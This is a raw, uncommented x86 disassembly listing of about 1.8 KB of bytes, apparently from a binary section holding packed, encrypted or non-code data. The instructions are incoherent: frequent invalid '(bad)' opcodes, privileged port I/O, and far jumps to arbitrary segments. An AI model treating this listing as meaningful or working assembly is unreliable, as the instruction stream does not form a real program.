  406d10:	in     al,0x4c
  406d12:	adc    DWORD PTR [ebx+0x5a7763b2],0xef0d4e3d
  406d1c:	ins    DWORD PTR es:[edi],dx
  406d1d:	daa    
  406d1e:	dec    ebp
  406d1f:	es or  al,0x36
  406d22:	adc    eax,0xd9cfb4a4
  406d27:	das    
  406d28:	pushf  
  406d29:	pop    edi
  406d2a:	sub    DWORD PTR [ebx+0x353b1602],ecx
  406d30:	mov    dl,0xf3
  406d32:	jae    0x406cc9
  406d34:	je     0x406d26
  406d36:	in     al,dx
  406d37:	push   0xfffffffe
  406d39:	fwait
  406d3a:	in     al,dx
  406d3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d3c:	cmp    edx,DWORD PTR [edi]
  406d3e:	sbb    al,BYTE PTR [edx]
  406d40:	xor    bl,al
  406d42:	push   eax
  406d43:	mov    eax,0x5df1979c
  406d48:	mov    dl,0x2f
  406d4a:	sub    edx,DWORD PTR [esi-0x45]
  406d4d:	sub    dl,BYTE PTR [esi-0x59]
  406d50:	mov    DWORD PTR ds:0x1ed35b71,ebp
  406d56:	pop    ss
  406d57:	mov    DWORD PTR [edx-0xfab572c],esi
  406d5d:	je     0x406d0c
  406d5f:	(bad)  [edx]
  406d61:	push   ebx
  406d62:	cmp    eax,0xe3fbbd0c
  406d67:	push   cs
  406d68:	jo     0x406d56
  406d6a:	add    ah,BYTE PTR [eax-0x286ef5ad]
  406d70:	jmp    FWORD PTR [esi+0x6a]
  406d73:	mov    esi,0x6b9aa5c4
  406d78:	push   esi
  406d79:	jnp    0x406dfa
  406d7b:	call   0xef4223bc
  406d80:	pop    ebx
  406d81:	pop    ebx
  406d82:	call   0x8e53:0x573eba33
  406d89:	adc    al,0x84
  406d8b:	test   DWORD PTR [ecx-0xe06a50f],edi
  406d91:	mov    ds:0x73a3d058,al
  406d96:	jmp    0x3e2:0xb0ffdfa7
  406d9d:	daa    
  406d9e:	lea    edi,[esi]
  406da0:	mov    dl,0x63
  406da2:	cmp    dh,dl
  406da4:	int3   
  406da5:	or     eax,0x4116f56
  406daa:	mov    bl,0xbf
  406dac:	aad    0x9f
  406dae:	sbb    cl,BYTE PTR [ebx-0x2a]
  406db1:	cmp    ecx,DWORD PTR [edx]
  406db3:	lock mov dl,0xea
  406db6:	and    DWORD PTR [ebx],ebx
  406db8:	iret   
  406db9:	inc    eax
  406dba:	sahf   
  406dbb:	mov    ebx,0x3431043a
  406dc0:	jb     0x406e2f
  406dc2:	sti    
  406dc3:	sbb    BYTE PTR [eax+eiz*8-0x2b],0x4b
  406dc8:	mov    eax,0x997ea01c
  406dcd:	or     al,0x78
  406dcf:	into   
  406dd0:	icebp  
  406dd1:	test   BYTE PTR [edx],bh
  406dd3:	jl     0x406df2
  406dd5:	in     eax,0x8e
  406dd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406dd8:	push   edx
  406dd9:	std    
  406dda:	pop    esi
  406ddb:	sub    al,0xa
  406ddd:	inc    esp
  406dde:	test   eax,0x9a677b6f
  406de3:	cvtps2pi mm7,xmm3
  406de6:	cdq    
  406de7:	test   eax,0x985c2bbd
  406dec:	mov    ds:0xb22a27d6,eax
  406df1:	(bad)  
  406df2:	cmp    al,0xd6
  406df4:	js     0x406d79
  406df6:	mov    dl,0x41
  406df8:	mov    esp,0xd9b4f3d
  406dfd:	retf   
  406dfe:	pop    edx
  406dff:	inc    edi
  406e00:	mov    esi,0xa7a442d0
  406e05:	push   edx
  406e06:	addr16 sub eax,0xa27a39b4
  406e0c:	xor    DWORD PTR [edx],esi
  406e0e:	fwait
  406e0f:	int    0xd0
  406e11:	repnz fnstsw WORD PTR [esi+0x4a]
  406e15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e16:	stos   BYTE PTR es:[edi],al
  406e17:	add    esp,edx
  406e19:	or     esp,ecx
  406e1b:	popf   
  406e1c:	sub    bh,BYTE PTR [edx+0x5e7c09ee]
  406e22:	cwde   
  406e23:	mov    ch,0x87
  406e25:	mov    ds:0x8b7ab9f4,al
  406e2a:	jno    0x406e80
  406e2c:	fiadd  DWORD PTR [ebp-0x9]
  406e2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e30:	in     al,dx
  406e31:	scas   al,BYTE PTR es:[edi]
  406e32:	mov    al,ds:0xfa5957d0
  406e37:	div    DWORD PTR [edx-0x49cb1f8b]
  406e3d:	cld    
  406e3e:	add    al,0x75
  406e40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e41:	or     esp,edi
  406e43:	push   esp
  406e44:	jo     0x406df5
  406e46:	cmc    
  406e47:	jmp    0xd0d8:0xb89a314a
  406e4e:	icebp  
  406e4f:	push   0x6
  406e51:	mov    edx,0xa41bb984
  406e56:	xchg   ebx,eax
  406e57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e58:	and    BYTE PTR ds:0x2c431889,0x94
  406e5f:	popf   
  406e60:	mov    cl,0x54
  406e62:	pop    ecx
  406e63:	inc    edi
  406e64:	(bad)  
  406e65:	mov    bl,0x5b
  406e67:	push   edx
  406e68:	cli    
  406e69:	ss hlt 
  406e6b:	mov    ebp,0xe170c732
  406e70:	shl    eax,cl
  406e72:	dec    ecx
  406e73:	mov    DWORD PTR [ebx+0x314133dc],esi
  406e79:	jnp    0x406e42
  406e7b:	mov    es,edx
  406e7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e7e:	jecxz  0x406e27
  406e80:	loop   0x406ecf
  406e82:	jbe    0x406eae
  406e84:	bound  edi,QWORD PTR [edi-0x3e4de18b]
  406e8a:	or     ebx,ebx
  406e8c:	imul   eax,DWORD PTR [esi+0x40],0xcd0bf015
  406e93:	inc    edx
  406e94:	push   eax
  406e95:	cmp    BYTE PTR [ecx-0x65ad70a7],0xda
  406e9c:	mov    bl,0xcb
  406e9e:	or     esp,edx
  406ea0:	std    
  406ea1:	push   ebx
  406ea2:	mul    DWORD PTR [eax+0x660a128e]
  406ea8:	nop
  406ea9:	sub    eax,DWORD PTR [edx]
  406eab:	and    eax,0x2e9ac23f
  406eb0:	mov    eax,0x36026a2b
  406eb5:	fs dec ebx
  406eb7:	fist   DWORD PTR [edx+0xb]
  406eba:	jmp    0x406ea2
  406ebc:	mov    al,0xaa
  406ebe:	adc    cl,dh
  406ec0:	adc    BYTE PTR [ebp+0x67380094],cl
  406ec6:	pop    esi
  406ec7:	pop    es
  406ec8:	dec    ebp
  406ec9:	cwde   
  406eca:	ret    
  406ecb:	mov    WORD PTR [edi+edx*1],cs
  406ece:	rol    DWORD PTR [ebp-0x66797403],cl
  406ed4:	sbb    al,0x92
  406ed6:	je     0x406e7e
  406ed8:	mov    ebx,0x499ca6f5
  406edd:	or     al,0x14
  406edf:	and    eax,0x39ca62f2
  406ee4:	sbb    BYTE PTR [ebx],cl
  406ee6:	inc    edx
  406ee7:	mov    dh,BYTE PTR [ecx+ebp*1-0x31]
  406eeb:	loop   0x406f06
  406eed:	mov    bl,0x9b
  406eef:	pop    es
  406ef0:	cmp    al,0x27
  406ef2:	mov    al,ds:0x6e009db5
  406ef7:	fistp  QWORD PTR [esi-0x1f01d9f5]
  406efd:	xor    eax,DWORD PTR [edi]
  406eff:	inc    edi
  406f00:	fsubr  QWORD PTR [ecx-0x66]
  406f03:	gs xor al,0xe4
  406f06:	inc    ecx
  406f07:	inc    edx
  406f08:	data16 xor BYTE PTR [eax-0x2f],dl
  406f0c:	inc    esi
  406f0d:	or     eax,ebp
  406f0f:	mov    bl,0xee
  406f11:	mov    al,ds:0x40e3cdd
  406f16:	mov    ds:0x590bde45,eax
  406f1b:	push   ebp
  406f1c:	in     al,0x30
  406f1e:	call   0x5a4c315b
  406f23:	xchg   ecx,eax
  406f24:	sbb    esi,DWORD PTR [ecx]
  406f26:	push   ecx
  406f27:	mov    cl,0xa0
  406f29:	mov    DWORD PTR [edx-0x7916bb65],ebx
  406f2f:	icebp  
  406f30:	xchg   BYTE PTR [esi+0xa1dd7fa],bl
  406f36:	xchg   ebx,eax
  406f37:	pusha  
  406f38:	mov    DWORD PTR [edi-0x1ca35030],esp
  406f3e:	mov    al,ds:0x6efdb2e2
  406f43:	xchg   ebx,eax
  406f44:	inc    edi
  406f45:	and    esp,DWORD PTR [ebx]
  406f47:	clc    
  406f48:	jecxz  0x406f2d
  406f4a:	sub    ah,BYTE PTR [eax+0x8dade07]
  406f50:	jl     0x406f4d
  406f52:	pop    esp
  406f53:	out    dx,al
  406f54:	mov    dh,0xca
  406f56:	call   0x1bf8:0x7fc44d6f
  406f5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f5e:	imul   edx,DWORD PTR [edi-0x38],0xb
  406f62:	std    
  406f63:	iret   
  406f64:	xor    eax,0xa9023842
  406f69:	mov    al,ds:0x1e8e409a
  406f6e:	mov    ebx,0x539f4ab6
  406f73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f74:	jmp    0xcddb:0xc0c32b14
  406f7b:	jg     0x406f6f
  406f7d:	call   0x8a82db27
  406f82:	aaa    
  406f83:	add    DWORD PTR [ecx-0x47],0xf4568326
  406f8a:	xchg   esp,eax
  406f8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f8c:	sub    ebp,ebx
  406f8e:	push   ss
  406f8f:	sub    DWORD PTR [edi+edi*2-0x364d783d],ebx
  406f96:	and    eax,DWORD PTR [ecx]
  406f98:	mov    DWORD PTR [ebx+esi*1+0x27],ebp
  406f9c:	mov    dh,0xb
  406f9e:	xor    ah,0xbd
  406fa1:	mov    BYTE PTR [ecx+0x3],dl
  406fa4:	test   ah,al
  406fa6:	call   0xf87d:0x21f823c
  406fad:	sti    
  406fae:	xor    BYTE PTR [edi-0x5d0db4a],ah
  406fb4:	adc    BYTE PTR [edx-0x71],dh
  406fb7:	push   ebx
  406fb8:	mov    dl,0xd7
  406fba:	jg     0x40702a
  406fbc:	(bad)
  406fc0:	loope  0x406fcd
  406fc2:	(bad)  
  406fc3:	and    eax,DWORD PTR [edi]
  406fc5:	push   0xc5558310
  406fca:	test   BYTE PTR [eax],dh
  406fcc:	imul   ebp,DWORD PTR [esi],0x1a
  406fcf:	stc    
  406fd0:	dec    DWORD PTR [eax]
  406fd2:	xor    edx,ebx
  406fd4:	cld    
  406fd5:	or     esi,ecx
  406fd7:	pop    ss
  406fd8:	icebp  
  406fd9:	and    eax,0x23a5b2dd
  406fde:	jo     0x406fc6
  406fe0:	mov    dl,0xc3
  406fe2:	fiadd  WORD PTR [esp+esi*4+0x7d75189a]
  406fe9:	or     ch,BYTE PTR [edx+ecx*2+0x39d7b2aa]
  406ff0:	cs out 0xfb,eax
  406ff3:	mov    ?,WORD PTR [edx-0x174c9c3f]
  406ff9:	cmp    ch,BYTE PTR [esi+0x35]
  406ffc:	retf   
  406ffd:	adc    al,0xb7
  406fff:	dec    ecx
  407000:	mov    ecx,DWORD PTR [ebx]
  407002:	pop    edx
  407003:	xchg   DWORD PTR [edx+0x3f],ebx
  407006:	xor    edx,0xffffffb2
  407009:	imul   ecx,DWORD PTR [ebx],0x48c73c19
  40700f:	out    dx,al
  407010:	popa   
  407011:	pop    ds
  407012:	inc    edi
  407013:	scas   eax,DWORD PTR es:[edi]
  407014:	push   0x63189a9c
  407019:	pop    ebp
  40701a:	aas    
  40701b:	mov    ecx,0xbb941670
  407020:	in     eax,dx
  407021:	ret    0xe7cf
  407024:	das    
  407025:	fs cs add edx,ecx
  407029:	in     eax,dx
  40702a:	and    al,0xa7
  40702c:	dec    ebp
  40702d:	or     DWORD PTR [eax-0x3a],eax
  407030:	sub    BYTE PTR [eax+0xb2716c],bh
  407036:	adc    eax,0xadaabe0e
  40703b:	out    0x96,al
  40703d:	jecxz  0x4070a2
  40703f:	cdq    
  407040:	(bad)  
  407041:	push   0x1a
  407043:	jns    0x407071
  407045:	pop    ebx
  407046:	bound  ebx,QWORD PTR [ecx]
  407048:	rol    edi,0x90
  40704b:	pusha  
  40704c:	fild   DWORD PTR [edx+0x2f]
  40704f:	inc    esi
  407050:	mov    bl,0xfa
  407052:	inc    ecx
  407053:	(bad)  
  407054:	mov    ch,0x2c
  407056:	pop    edx
  407057:	mov    ebx,0xda6c0b1f
  40705c:	cmc    
  40705d:	and    al,0xfa
  40705f:	jle    0x407078
  407061:	stc    
  407062:	loopne 0x406ff2
  407064:	mov    dl,0x48
  407066:	jmp    0x549fec67
  40706b:	rol    eax,cl
  40706d:	in     eax,dx
  40706e:	lahf   
  40706f:	test   al,0xb5
  407071:	ds pop ds
  407073:	xchg   ebx,eax
  407074:	das    
  407075:	or     esp,DWORD PTR [eax-0x1a]
  407078:	imul   edx,DWORD PTR [edi-0x76],0x60
  40707c:	(bad)  
  40707d:	pop    ss
  40707e:	das    
  40707f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407080:	mov    edx,0xe267fc08
  407085:	aam    0x71
  407087:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407088:	and    DWORD PTR [ebp+0x6aa116e2],ecx
  40708e:	jge    0x407059
  407090:	dec    eax
  407091:	adc    eax,0xdfbcb94
  407096:	pusha  
  407097:	out    0xa2,eax
  407099:	aaa    
  40709a:	(bad)  
  40709b:	mov    edx,0xef54750c
  4070a0:	dec    esi
  4070a1:	jmp    0x5074:0x77550a9a
  4070a8:	sti    
  4070a9:	lea    ebx,[edx-0x63bbe34d]
  4070af:	jae    0x407077
  4070b1:	xchg   ecx,eax
  4070b2:	js     0x40708e
  4070b4:	jo     0x4070c0
  4070b6:	push   cs
  4070b7:	jo     0x40705d
  4070b9:	mov    bh,0xe5
  4070bb:	ret    
  4070bc:	aad    0xc7
  4070be:	xor    al,0x4c
  4070c0:	push   ecx
  4070c1:	je     0x40705d
  4070c3:	inc    ebx
  4070c4:	in     al,0x66
  4070c6:	stos   DWORD PTR es:[edi],eax
  4070c7:	push   es
  4070c8:	iret   
  4070c9:	or     ebp,DWORD PTR [esi+0x6ae8072f]
  4070cf:	addr16 jmp 0x6ce0:0xe8a39a99
  4070d7:	iret   
  4070d8:	add    DWORD PTR [ebx+0x3516ff5b],edx
  4070de:	call   0x680e:0x2415cea1
  4070e5:	mov    DWORD PTR [edx+0x3dae2438],ebx
  4070eb:	jo     0x4070c8
  4070ed:	xor    al,0x90
  4070ef:	cdq    
  4070f0:	(bad)  
  4070f1:	fstp   QWORD PTR [edx]
  4070f3:	xlat   BYTE PTR ds:[ebx]
  4070f4:	ins    DWORD PTR es:[edi],dx
  4070f5:	mov    BYTE PTR [edi],dh
  4070f7:	mov    cl,0x2a
  4070f9:	stc    
  4070fa:	xor    BYTE PTR fs:[edx-0x4c5fc1c6],0x5a
  407102:	adc    DWORD PTR [ebp-0x6f88f496],ecx
  407108:	add    al,0x2f
  40710a:	(bad)  
  40710b:	daa    
  40710c:	or     DWORD PTR [ecx+0x3edead9a],eax
  407112:	sbb    BYTE PTR [esi],al
  407114:	mov    ecx,0x814b3fbb
  407119:	or     edi,DWORD PTR [eax+0x6e8c8c04]
  40711f:	or     DWORD PTR [esi+0x1259e1cc],ecx
  407125:	in     al,0x47
  407127:	mov    bh,0xb2
  407129:	fsubr  st(5),st
  40712b:	sar    BYTE PTR [edi-0x2c471338],cl
  407131:	or     ebp,DWORD PTR [eax+0x4e]
  407134:	or     WORD PTR [ebx],0x7d3e
  407139:	cmp    bl,BYTE PTR [edx+0x5ed2c8cf]
  40713f:	mov    cs,esp
  407141:	popf   
  407142:	jmp    0x37fb:0xa00b6237
  407149:	fwait
  40714a:	inc    ebp
  40714b:	leave  
  40714c:	add    dh,BYTE PTR [edx-0x21aa1866]
  407152:	test   al,0x60
  407154:	cld    
  407155:	je     0x4071ac
  407157:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407158:	xchg   edi,eax
  407159:	ds into 
  40715b:	sbb    esi,DWORD PTR [edx-0x9]
  40715e:	add    DWORD PTR [ebx],esp
  407160:	mov    dl,0xb0
  407162:	pusha  
  407163:	fstp   DWORD PTR [eax]
  407166:	add    BYTE PTR [ebx-0x5d4bf49e],0xd7
  40716d:	test   DWORD PTR [ecx+ebp*4-0x5f1d6e36],edi
  407174:	mov    DWORD PTR [ecx+0x62],esp
  407177:	mov    esp,ebx
  407179:	push   esi
  40717a:	call   0xdb46:0x6e440e36
  407181:	or     cl,bh
  407183:	lods   al,BYTE PTR ds:[esi]
  407184:	jp     0x407164
  407186:	pusha  
  407187:	sbb    esp,ecx
  407189:	(bad)  
  40718b:	fisttp WORD PTR [esi-0x49]
  40718e:	or     al,al
  407190:	mov    dh,0x79
  407192:	mov    esp,0x70309cf5
  407197:	data16 aam 0xe2
  40719a:	lea    edx,[edi-0x1d]
  40719d:	mov    eax,0x9e2ee486
  4071a2:	fldenv [ebx+0x7fb79013]
  4071a8:	and    dl,BYTE PTR [ebx+ebx*2-0x59]
  4071ac:	cmp    eax,0xf8b80c1
  4071b1:	push   edi
  4071b2:	cmp    dh,BYTE PTR gs:[edx+0x3c13290d]
  4071b9:	pinsrw mm6,WORD PTR [edi+0x42],0x8
  4071be:	xor    al,0x63
  4071c0:	sbb    ecx,0x2
  4071c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4071c4:	sub    ah,cl
  4071c6:	imul   bl
  4071c8:	push   ebp
  4071c9:	ret    
  4071ca:	(bad)  
  4071cb:	lods   eax,DWORD PTR ds:[esi]
  4071cc:	mov    dl,0xd3
  4071ce:	stc    
  4071cf:	add    DWORD PTR [ebp+0x1b2398c0],0x9df26904
  4071d9:	call   0x9685:0x70bc71a
  4071e0:	mov    al,0x23
  4071e2:	mov    dh,0x2e
  4071e4:	mov    DWORD PTR [ecx+0x74],esp
  4071e7:	out    0x2,eax
  4071e9:	iret   
  4071ea:	add    BYTE PTR [ebx-0x4065cab8],bl
  4071f0:	cmc    
  4071f1:	fnsave [edx]
  4071f3:	mov    ebx,0xe29ad080
  4071f8:	xor    BYTE PTR [edi+0x22],0x5e
  4071fc:	pop    ebp
  4071fd:	es retf 
  4071ff:	dec    edx
  407200:	lea    sp,[esi-0x29]
  407204:	mov    ch,0x35
  407206:	stc    
  407207:	sub    DWORD PTR [edx],esi
  407209:	ins    DWORD PTR es:[edi],dx
  40720a:	sahf   
  40720b:	mov    dl,0xe5
  40720d:	sub    ecx,DWORD PTR [ebx+0x56]
  407210:	mov    dl,0x90
  407212:	fild   WORD PTR [esi-0x5e]
  407215:	or     cl,BYTE PTR [ebp+edx*2-0x7ffff7d4]
  40721c:	push   edx
  40721d:	sbb    dh,dh
  40721f:	test   BYTE PTR [edx],dh
  407221:	loop   0x40727e
  407223:	and    DWORD PTR [eax-0x53],ecx
  407226:	xchg   esi,eax
  407227:	popa   
  407228:	mov    DWORD PTR [edx-0xf116d5],0x7112a715
  407232:	outs   dx,BYTE PTR ds:[esi]
  407233:	cmc    
  407234:	add    ah,BYTE PTR [ebx-0x5b518a7e]
  40723a:	mov    esi,0x9a9b9c93
  40723f:	jge    0x40722b
  407241:	jg     0x407244
  407243:	stos   DWORD PTR es:[edi],eax
  407244:	inc    edi
  407245:	or     eax,DWORD PTR [ecx+0x3a8127f3]
  40724b:	dec    eax
  40724c:	ror    esp,0x99
  40724f:	ins    DWORD PTR es:[edi],dx
  407250:	push   ss
  407251:	sti    
  407252:	inc    ebp
  407253:	out    dx,eax
  407254:	xchg   ebp,eax
  407255:	retf   
  407256:	ror    BYTE PTR [esi],1
  407258:	das    
  407259:	xor    ch,BYTE PTR [edi+ebx*1-0x283de44e]
  407260:	cmp    ebx,DWORD PTR [eax]
  407262:	daa    
  407263:	xchg   DWORD PTR [edi+0x5a273521],ecx
  407269:	jns    0x407269
  40726b:	js     0x40727d
  40726d:	fcom   DWORD PTR [ebx+0x23f667a4]
  407273:	xor    BYTE PTR [esi+ecx*8],ah
  407276:	pop    edx
  407277:	arpl   WORD PTR [ebp-0x763b65d3],bp
  40727d:	add    DWORD PTR [ebx+0x5d],esp
  407280:	and    edi,DWORD PTR [edx-0x5d]
  407283:	mov    al,ds:0xca5a47f1
  407288:	popa   
  407289:	pushf  
  40728a:	dec    edi
  40728b:	addr16 out 0xc0,eax
  40728e:	jbe    0x407287
  407290:	mov    bl,0x68
  407292:	mov    ebx,0x97d1b5da
  407297:	jl     0x407317
  407299:	cdq    
  40729a:	inc    esi
  40729b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40729c:	inc    ecx
  40729d:	inc    edi
  40729e:	pop    eax
  40729f:	pop    edx
  4072a0:	aad    0x70
  4072a2:	enter  0x28d,0xf3
  4072a6:	call   0xe35:0xb65e64ba
  4072ad:	aaa    
  4072ae:	loopne 0x407257
  4072b0:	das    
  4072b1:	shl    BYTE PTR [ecx],1
  4072b3:	and    al,0x2c
  4072b5:	rcl    al,0x17
  4072b8:	mov    cl,0x60
  4072ba:	sub    eax,0xd804f7ee
  4072bf:	pop    es
  4072c0:	in     al,dx
  4072c1:	arpl   WORD PTR [eax+0x4f3273d9],cx
  4072c7:	mov    dh,0x32
  4072c9:	jmp    0x8486e42f
  4072ce:	test   cl,al
  4072d0:	mov    DWORD PTR [esi-0x68],eax
  4072d3:	cmp    DWORD PTR [ebx-0x1291e22c],ebx
  4072d9:	pop    ebx
  4072da:	or     dh,ch
  4072dc:	test   eax,0xe6a7a29f
  4072e1:	or     eax,0x87368055
  4072e6:	jae    0x4072b5
  4072e8:	mov    dl,0x1c
  4072ea:	stc    
  4072eb:	xchg   esp,eax
  4072ec:	mov    esi,0xa46fe658
  4072f1:	or     eax,DWORD PTR [esi-0x42f9a07a]
  4072f7:	pop    esp
  4072f8:	pop    ds
  4072f9:	(bad)  
  4072fa:	fsave  [eax+0x6ba4482]
  407301:	adc    eax,DWORD PTR [esi-0x53]
  407304:	arpl   WORD PTR [ebx],cx
  407306:	dec    ebp
  407307:	sub    eax,0x7eaae9f6
  40730c:	mov    esi,esp
  40730e:	out    dx,al
  40730f:	dec    ecx
  407310:	mov    cl,0xee
  407312:	into   
  407313:	inc    edi
  407314:	push   esp
  407315:	push   ebp
  407316:	cmp    al,0x2f
  407318:	ds test al,0x3e
  40731b:	sahf   
  40731c:	into   
  40731d:	adc    al,0x99
  40731f:	xor    al,0xb5
  407321:	cmp    al,0x60
  407323:	jmp    0xc0b3:0xdaac7312
  40732a:	(bad)  
  40732b:	push   esi
  40732c:	std    
  40732d:	pop    eax
  40732f:	push   es
  407330:	shr    BYTE PTR [ecx+edi*2-0x655cc163],cl
  407337:	repnz ins BYTE PTR es:[edi],dx
  407339:	mov    ah,0x1c
  40733b:	shl    DWORD PTR [ebx-0x1a],1
  40733e:	fs push esi
  407340:	mov    cl,0x4a
  407342:	lods   al,BYTE PTR ds:[esi]
  407343:	lods   al,BYTE PTR ds:[esi]
  407344:	xor    eax,0xd46706cb
  407349:	dec    esi
  40734a:	pop    ds
  40734b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40734c:	loopne 0x407312
  40734e:	xchg   edi,eax
  40734f:	sub    DWORD PTR [ebx],0xffffffad
  407352:	fld    DWORD PTR [eax-0x4e]
  407355:	mov    bh,0x2c
  407357:	jecxz  0x40730d
  407359:	scas   eax,DWORD PTR es:[edi]
  40735a:	sub    esp,esi
  40735c:	and    al,0xa
  40735e:	out    dx,eax
  40735f:	sbb    al,ah
  407361:	and    eax,0xee53ba91
  407366:	fist   WORD PTR [ebx-0x1c]
  407369:	in     al,dx
  40736a:	call   0x67bb:0xfa077691
  407371:	std    
  407372:	mov    fs,WORD PTR [edi-0x36341737]
  407378:	jo     0x407300
  40737a:	or     ch,bl
  40737c:	inc    esi
  40737d:	cmp    al,0x9a
  40737f:	mov    ebp,0xbb6fddc3
  407384:	repz xor DWORD PTR gs:[edi+0x701600],esp
  40738c:	sub    al,0x76
  40738e:	les    eax,FWORD PTR [edx-0x84d9d4e]
  407394:	rcl    ch,1
  407396:	fs stos DWORD PTR es:[edi],eax
  407398:	dec    ebp
  407399:	aaa    
  40739a:	repnz or DWORD PTR [edx],esi
  40739d:	pop    eax
  40739e:	enter  0x20e,0xb1
  4073a2:	test   al,0x0
  4073a4:	enter  0x987a,0xda
  4073a8:	sub    cl,BYTE PTR [esi+edx*8+0x16]
  4073ac:	or     ebp,DWORD PTR [ebx-0x2b]
  4073af:	or     eax,0xc7c50b47
  4073b4:	fist   WORD PTR [esi]
  4073b6:	dec    ebx
  4073b7:	fwait
  4073b8:	das    
  4073b9:	rcr    DWORD PTR [edx-0x2603d61a],1
  4073bf:	out    dx,al
  4073c0:	add    eax,0xdea7ebb2
  4073c5:	xor    eax,0x549a200a
  4073ca:	sub    ebp,eax
  4073cc:	mov    dh,0x62
  4073ce:	cmc    
  4073cf:	(bad)  
  4073d0:	pushf  
  4073d1:	jb     0x40742d
  4073d3:	inc    edx
  4073d4:	std    
  4073d5:	je     0x407438
  4073d7:	mov    al,ds:0x888f5189
  4073dc:	inc    ebp
  4073dd:	xchg   esp,eax
  4073de:	addr16 daa 
  4073e0:	push   ds
  4073e1:	mov    bl,0x7f
  4073e3:	cmp    DWORD PTR [edi+0x7c9b9a22],0xffffffff
  4073ea:	loopne 0x40742d
  4073ec:	shl    esi,1
  4073ee:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4073f0:	adc    DWORD PTR [edi],edx
  4073f2:	mov    ds:0xe758ed66,al
  4073f7:	adc    al,0xb2
  4073f9:	sbb    al,0xa8
  4073fb:	ins    BYTE PTR es:[edi],dx
  4073fc:	cwde   
  4073fd:	sbb    edx,DWORD PTR [eax-0x1a]
  407400:	inc    ebx
  407401:	or     edi,DWORD PTR [eax]
  407403:	ja     0x40746d
  407405:	xor    BYTE PTR [edi-0x657faeb0],ah
  40740b:	loope  0x407418
  40740d:	popf   
  40740e:	leave  
  40740f:	add    ch,ah
  407411:	xlat   BYTE PTR ds:[ebx]
  407412:	add    bh,BYTE PTR [ebx-0x18dd6053]
  407418:	rcr    bh,1
  40741a:	mov    edx,DWORD PTR [edi-0x6b]
  40741d:	pop    es
  40741e:	out    0x38,al
  407420:	inc    ebp
  407421:	xlat   BYTE PTR ds:[ebx]
  407422:	outs   dx,DWORD PTR ds:[esi]
  407423:	in     al,0xb3
  407425:	nop
  407426:	mov    WORD PTR [edx],es
  407428:	or     eax,0x628a93b0
  40742d:	mov    eax,0xd12a7e1
  407432:	loopne 0x407453
  407434:	dec    esp
  407435:	jmp    0xfb0fa78d
  40743a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40743b:	and    al,0xc2
  40743d:	xchg   edi,eax
  40743e:	xchg   edi,eax
  40743f:	jnp    0x407473
  407441:	mov    ah,0xef
  407443:	adc    eax,0xdc73338e
  407448:	icebp  
  407449:	daa    
  40744a:	xor    bh,BYTE PTR [esi-0x597ad8b3]
  407450:	push   ds
  407451:	xchg   edi,eax
  407452:	lods   eax,DWORD PTR ds:[esi]
  407453:	out    0x42,eax
  407455:	sub    bl,bh
  407457:	push   esi
  407458:	stos   BYTE PTR es:[edi],al
  407459:	and    BYTE PTR [edx-0x59],bl
  40745c:	pop    edx
  40745d:	cli    
  40745e:	out    0xa6,eax
  407460:	add    dl,BYTE PTR [ebx-0x29]
  407463:	jp     0x4074c6
  407465:	xchg   ebx,eax
  407466:	cmc    
  407467:	(bad)  
  407468:	shr    BYTE PTR ds:0xecf9649a,cl
  40746e:	sbb    edx,DWORD PTR [edx-0x59f4859c]
  407474:	push   edx
  407475:	loopne 0x407487
  407477:	cmp    BYTE PTR [eax+0x4e],cl
  40747a:	sbb    BYTE PTR [edi-0x55],bh
  40747d:	dec    ecx
  40747e:	add    ch,BYTE PTR ds:0x9afaec52
  407484:	jb     0x407474
  407486:	mov    esp,0xe915b678
  40748b:	jl     0x4074bf
  40748d:	ret    0xd256
  407490:	mov    dl,0xed
  407492:	mov    bl,0xb7
  407494:	imul   BYTE PTR [edx+ebx*4+0x43]
  407498:	inc    eax
  407499:	lods   eax,DWORD PTR ds:[esi]
  40749a:	mov    edi,0xae318784
  40749f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4074a0:	rol    cl,cl
  4074a2:	jmp    0x543e7dc5
  4074a7:	cdq    
  4074a8:	mov    dl,0xae
  4074aa:	cmp    al,BYTE PTR [ebx+0x4da68310]
  4074b0:	jl     0x4074bd
  4074b2:	adc    ecx,edi
  4074b4:	sahf   
  4074b5:	xchg   esp,eax
  4074b6:	into   
  4074b7:	in     al,dx
  4074b8:	or     ch,dl
  4074ba:	in     eax,dx
  4074bb:	or     eax,0xf59b7acf
  4074c0:	js     0x40744d
  4074c2:	mov    esp,0x4abef566
  4074c7:	lds    edi,FWORD PTR ds:0xa285680b
  4074cd:	mov    eax,ds:0xced21eba
  4074d2:	test   DWORD PTR [ebx+0x22],eax
  4074d5:	add    ebx,edx
  4074d7:	push   esi
  4074d8:	popf   
  4074d9:	scas   al,BYTE PTR es:[edi]
  4074da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4074db:	mov    cl,0x11
  4074dd:	or     esp,DWORD PTR [edx-0x37]
  4074e0:	unpcklps xmm2,XMMWORD PTR [esi]
  4074e3:	in     eax,dx
  4074e4:	xchg   BYTE PTR [ebx+0x4bf4a49a],dh
  4074ea:	push   esp
  4074eb:	mov    ds:0xa75618c6,eax
  4074f0:	add    eax,0xac38e424
  4074f5:	fsubr  QWORD PTR [ebx+ebx*2-0x76]
  4074f9:	ins    BYTE PTR es:[edi],dx
  4074fa:	into   
  4074fb:	daa    
  4074fc:	sbb    bh,BYTE PTR [edx+0x31]
  4074ff:	retf   0x171d
